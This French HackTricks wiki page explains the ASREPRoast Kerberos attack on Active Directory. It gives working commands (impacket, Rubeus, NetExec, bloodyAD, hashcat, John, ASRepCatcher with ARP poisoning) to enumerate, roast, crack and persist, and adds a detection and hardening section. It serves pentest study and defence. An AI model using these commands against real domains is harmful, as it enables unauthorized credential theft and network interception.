# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast est une attaque de sécurité qui exploite les utilisateurs pour lesquels l’attribut **Kerberos pre-authentication required** est absent. Cette vulnérabilité permet aux attaquants de demander au contrôleur de domaine (DC) l’authentification d’un utilisateur sans avoir besoin de son mot de passe. Le DC répond alors avec un message chiffré à l’aide d’une clé dérivée du mot de passe de l’utilisateur. Les attaquants peuvent tenter de le cracker hors ligne pour découvrir le mot de passe.

Les principales conditions requises pour cette attaque sont les suivantes :

- **Absence de pré-authentification Kerberos** : cette fonctionnalité de sécurité ne doit pas être activée pour les utilisateurs ciblés.
- **Connexion au contrôleur de domaine (DC)** : les attaquants doivent pouvoir accéder au DC pour envoyer des requêtes et recevoir des messages chiffrés.
- **Compte de domaine facultatif** : un compte de domaine permet aux attaquants d’identifier plus efficacement les utilisateurs vulnérables à l’aide de requêtes LDAP. Sans ce compte, ils doivent deviner les noms d’utilisateur.

#### Énumération des utilisateurs vulnérables (identifiants de domaine requis)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Demande d’un message AS_REP

```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> Rubeus demande **RC4** par défaut. L’Event ID **4768** indique donc généralement **preauth type 0** et **ticket encryption type 0x17**. Si vous ajoutez **`/aes`** (ou si RC4 est désactivé pour la cible), attendez-vous plutôt à des etypes **AES**.<sup>[[2]](#references)</sup>

#### Commandes rapides (Linux)

- Commencez par énumérer les cibles potentielles (par exemple, à partir de chemins de build divulgués) avec l’énumération des utilisateurs Kerberos : `kerbrute userenum users.txt -d domain --dc dc.domain`
- Lancez un roast sur toute une liste de noms d’utilisateur, sans creds valides, avec NetExec : `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Si vous avez des creds, laissez NetExec interroger LDAP et demander tous les comptes pouvant être roastés : `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Si la sortie commence par **`$krb5asrep$23$`**, cassez-la avec Hashcat **`-m 18200`**. Si elle commence par **`$krb5asrep$17$`** ou **`$krb5asrep$18$`**, privilégiez John avec **`--format=krb5asrep`**.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Ne partez pas du principe que chaque AS-REP roast utilise RC4. Les outils modernes peuvent renvoyer **RC4** (`$krb5asrep$23$`) ou **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`), selon le type de chiffrement demandé ou négocié. **`hashcat -m 18200`** est destiné à l’**etype 23**, tandis que **John** gère directement `krb5asrep` pour les etypes **17/18/23**.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```

### Persistance

Forcer **preauth** n’est pas nécessaire pour un utilisateur sur lequel vous disposez des permissions **GenericAll** (ou des permissions d’écriture sur les propriétés) :

```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```

### Détection et durcissement

Une **requête AS-REP sans préauthentification** réussie génère un événement **4768** sur le DC avec `Status=0x0` et `PreAuthType=0` ; cela consigne une requête, et ne prouve pas que quelqu’un a cracké la réponse ou compromis le compte. N’exigez pas RC4 pour la détection : `TicketEncryptionType=0x17` est un indicateur utile de chiffrement faible, mais un attaquant peut demander AES (valeurs des journaux d’événements `0x11`/`0x12`). Sur Windows Server 2016 et versions ultérieures avec la mise à jour cumulative du 14 janvier 2025 (ou une version plus récente), la version 2 de l’événement 4768 expose aussi `ClientAdvertizedEncryptionTypes`, les etypes pris en charge et les clés disponibles pour le compte/DC.<sup>[[5]](#references)</sup>

Une chasse pratique signale un client qui annonce uniquement RC4 alors que le compte possède des clés AES, puis corrèle les pics de requêtes provenant d’une même adresse IP pour plusieurs utilisateurs sans préauthentification. Établissez une base des exceptions légitimes au lieu de déclencher une alerte pour chaque événement `PreAuthType=0`.

Pour l’attribution, normalisez le champ `IpAddress` (qui peut contenir une adresse IPv4 mappée au format `::ffff:`) et comparez sa fenêtre temporelle aux événements 4769 de tickets de service ou 5140 d’accès aux partages. Ces événements peuvent indiquer des comptes actifs depuis la même adresse, mais une requête AS-REP sans préauthentification ne nécessite aucun compte authentifié. Les hôtes partagés, le NAT, les proxies et les sessions multiples impliquent qu’une correspondance d’adresse IP ne permet **pas** d’identifier la personne ou le compte à l’origine de l’AS-REQ. Considérez les comptes associés comme des pistes d’enquête et corroborez-les à l’aide de preuves provenant des endpoints ou du réseau.<sup>[[5]](#references)[[7]](#references)[[8]](#references)</sup>

La solution durable consiste à décocher **Ne pas exiger la préauthentification Kerberos** pour chaque utilisateur qui n’en a pas strictement besoin, puis à renouveler les mots de passe des comptes exposés. Si une exception ne peut pas être supprimée, utilisez un mot de passe long généré aléatoirement et des privilèges minimaux. Désactiver RC4 augmente le coût du cracking, mais ne supprime pas la possibilité de roast, car les réponses AS-REP AES restent crackables hors ligne.<sup>[[2]](#references)[[5]](#references)</sup>

## ASREProast sans identifiants

Un attaquant placé sur le chemin peut capturer l’AS-REP renvoyé lors d’un échange AS normal avec préauthentification et formater sa partie chiffrée pour la cracker hors ligne. Contrairement à l’ASREPRoasting classique, cela ne nécessite pas `DONT_REQ_PREAUTH` ; toutefois, seuls les comptes dont l’échange Kerberos est effectivement intercepté peuvent être ciblés. **ASRepCatcher** obtient cette position par empoisonnement ARP unidirectionnel par défaut, ou peut consommer le trafic d’une autre technique MitM avec `--disable-spoofing`.<sup>[[6]](#references)</sup>\
Si vous cherchez la technique associée sans identifiants qui renvoie un **ticket de service** au lieu d’un **TGT** depuis un principal sans préauthentification, consultez [Kerberoast](kerberoast.md).

En mode `relay`, [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) relaie les AS-REQ interceptées et impose **RC4** lorsque les deux parties l’autorisent encore. Le mode `listen` ne modifie pas les paquets et capture donc l’etype négocié par le client et le DC. Si possible, limitez l’empoisonnement avec `-t`/`-tf` plutôt que de toucher tout le sous-réseau.<sup>[[6]](#references)</sup>

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```

---

---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Événement 4768 : Un ticket d’authentification Kerberos a été demandé](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
- [7] [Microsoft – Événement de sécurité 4769](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [8] [Microsoft – Événement de sécurité 5140](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-5140)
{{#include ../../banners/hacktricks-training.md}}
